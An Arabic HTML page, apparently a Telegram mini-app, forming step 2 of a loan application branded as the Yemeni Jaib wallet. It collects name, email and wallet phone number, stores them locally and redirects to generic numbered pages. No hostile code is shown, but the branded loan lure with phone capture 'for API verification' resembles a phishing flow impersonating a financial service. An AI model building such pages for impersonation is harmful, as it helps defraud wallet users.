<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جيب (Jaib) - طلب القرض</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <!-- ✅ Arabic Font (Tajawal) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --jaib-red: #D9142B;          /* Jaib Signature Crimson Red */
            --jaib-red-dark: #B00E21;
            --jaib-dark: #18181B;         /* Deep Charcoal Text */
            --jaib-accent-red: #C81026;
            --bg-color: #F7F7F8;
            --card-bg: #FFFFFF;
            --soft-red-bg: #FFF5F6;
            --soft-red-border: #FAD1D6;
            --text-main: #111111;
            --text-muted: #666666;
            --input-border: #E5E7EB;
            --input-focus: #D9142B;
            --btn-gray: #F0F2F5;
            --btn-gray-text: #444444;
        }

        * {
            box-sizing: border-box;
            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }

        /* Top Header Navigation Bar - Jaib Red */
        .app-header {
            width: 100%;
            background-color: var(--jaib-red);
            height: 62px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(217, 20, 43, 0.22);
        }

        .back-btn-top {
            color: #FFFFFF;
            text-decoration: none;
            font-weight: 800;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .header-brand {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .jaib-logo-badge {
            width: 32px;
            height: 32px;
            background: #FFFFFF;
            border-radius: 9px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.12);
        }

        .header-title {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 20px;
            font-weight: 900;
            color: #FFFFFF;
        }

        .header-title .region {
            color: var(--jaib-red);
            background: #FFFFFF;
            font-size: 12px;
            font-weight: 800;
            padding: 2px 8px;
            border-radius: 5px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: #FFFFFF;
            border-radius: 2px;
        }

        /* Card Layout */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 20px;
            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
            border: 1px solid #F0F0F0;
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 25px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 900;
        }

        .subtext {
            font-size: 14px;
            color: var(--jaib-accent-red);
            text-align: center;
            margin-bottom: 22px;
            font-weight: 800;
        }

        /* Step Progress Bar */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 0 auto 30px;
            width: 100%;
        }

        .step-bar {
            flex: 1;
            height: 6px;
            background-color: #E5E7EB;
            border-radius: 3px;
        }

        .step-bar.active {
            background-color: var(--jaib-red);
        }

        /* Form Inputs */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 800;
            color: var(--jaib-dark);
            margin-bottom: 8px;
        }

        .form-control {
            font-size: 15px;
            padding: 13px 16px;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            background-color: #FFFFFF;
            color: #111111;
            outline: none;
            width: 100%;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-control::placeholder {
            color: #A0AEC0;
        }

        .form-control:focus {
            border-color: var(--input-focus);
            box-shadow: 0 0 0 3px rgba(217, 20, 43, 0.1);
        }

        /* Phone Input Group */
        .phone-group {
            display: flex;
            gap: 10px;
            direction: ltr;
        }

        .country-prefix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background-color: var(--soft-red-bg);
            border: 2px solid var(--soft-red-border);
            border-radius: 10px;
            padding: 0 14px;
            font-weight: 800;
            font-size: 15px;
            color: var(--jaib-dark);
            white-space: nowrap;
        }

        .flag-icon {
            font-size: 18px;
            line-height: 1;
        }

        .phone-hint {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
        }

        /* Buttons Container */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #E2E6EA;
        }

        .btn-next {
            background-color: var(--jaib-red);
            color: #FFFFFF;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 800;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            box-shadow: 0 4px 14px rgba(217, 20, 43, 0.32);
        }

        .btn-next:active {
            background-color: var(--jaib-red-dark);
            transform: scale(0.99);
        }

        /* Footer Banner */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 13px;
            color: #666666;
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- Jaib Red Header Navigation Bar -->
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← رجوع</a>
    <div class="header-brand">
        <div class="jaib-logo-badge">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M4 6H8M11 6H19V13C19 16.866 15.866 20 12 20C8.13401 20 5 16.866 5 13V11" stroke="#D9142B" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
                <circle cx="9.5" cy="10.5" r="2" fill="#D9142B"/>
            </svg>
        </div>
        <div class="header-title">
            <span>جيب</span><span class="region">Jaib</span>
        </div>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">طلب القرض</h1>
    <div class="subtext">الخطوة 2 من 3</div>

    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <!-- Personal Info Form -->
    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">الاسم الأول</label>
            <input type="text" id="firstName" class="form-control" placeholder="محمد" required>
        </div>

        <div class="form-group">
            <label for="lastName">اللقب / الاسم الأخير</label>
            <input type="text" id="lastName" class="form-control" placeholder="الهاشمي" required>
        </div>

        <div class="form-group">
            <label for="email">البريد الإلكتروني</label>
            <input type="email" id="email" class="form-control" placeholder="name@example.com" required>
        </div>

        <div class="form-group">
            <label for="phone">رقم هاتف محفظة جيب (Jaib)</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span class="flag-icon">🇾🇪</span>
                    <span>+967</span>
                </div>
                <input type="tel" id="phone" class="form-control" placeholder="771234567" maxlength="9" pattern="[0-9]{9}" required>
            </div>
            <div class="phone-hint">أدخل 9 أرقام بدون صفر البداية (مثال: 771234567)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
            <button type="submit" class="btn-next">التالي</button>
        </div>
    </form>
</div>

<!-- Footer -->
<div class="footer-banner">
    © 2026 محفظة جيب (Jaib) - اليمن #تغنيك_عن_الجميع
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Auto-fill existing saved user info
        const fName = localStorage.getItem('firstName');
        const lName = localStorage.getItem('lastName');
        const email = localStorage.getItem('email');
        const phone = localStorage.getItem('phone');

        if (fName) document.getElementById('firstName').value = fName;
        if (lName) document.getElementById('lastName').value = lName;
        if (email) document.getElementById('email').value = email;
        if (phone) document.getElementById('phone').value = phone;
    };

    function goNext(event) {
        event.preventDefault();

        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!fName || !lName || !email || !phone) {
            alert("يرجى تعبئة جميع الحقول المطلوبة.");
            return;
        }

        if (!/^\d{9}$/.test(phone)) {
            alert("يرجى إدخال رقم هاتف جيب صحيح مكوّن من 9 أرقام.");
            return;
        }

        // Save stored details
        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        
        // Save phone specifically for API verification
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>

</body>
</html>
